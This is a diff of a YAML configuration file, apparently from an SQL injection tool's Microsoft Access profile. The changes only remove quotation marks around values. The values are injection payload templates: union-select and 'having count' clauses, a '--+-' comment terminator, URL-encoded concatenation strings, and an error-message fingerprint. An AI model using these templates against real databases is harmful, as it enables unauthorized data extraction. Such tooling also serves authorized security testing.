@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   select 
@@ -84,7 +84,7 @@ resource:
         {limit}
     ) a
    fields: 
-    field: "${FIELD}"
+    field: ${FIELD}
     concat: "%26 '%7f' %26"
     
 strategy: 
@@ -98,16 +98,16 @@ strategy:
            65536
        ) r 
    from (${INJECTION})x
-  limit: "having count(*) between ${LIMIT} and ${LIMIT}"
-  failsafe: "select '' %26 (1337${INDICE}7330%2b1) r from dual"
-  calibrator: "string(65536, '${CALIBRATOR_SQL}')"
+  limit: having count(*) between ${LIMIT} and ${LIMIT}
+  failsafe: select '' %26 (1337${INDICE}7330%2b1) r from dual
+  calibrator: string(65536, '${CALIBRATOR_SQL}')
   limitBoundary: 1
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
-    - "MS Access"
+    - MS Access
     
  normal: 
-  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE})"
-  capacity: "(select '${LEAD}${INDICE}' %26 ${CALIBRATOR} from dual)"
-  orderBy: "order by 1337"
+  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE})
+  capacity: (select '${LEAD}${INDICE}' %26 ${CALIBRATOR} from dual)
+  orderBy: order by 1337
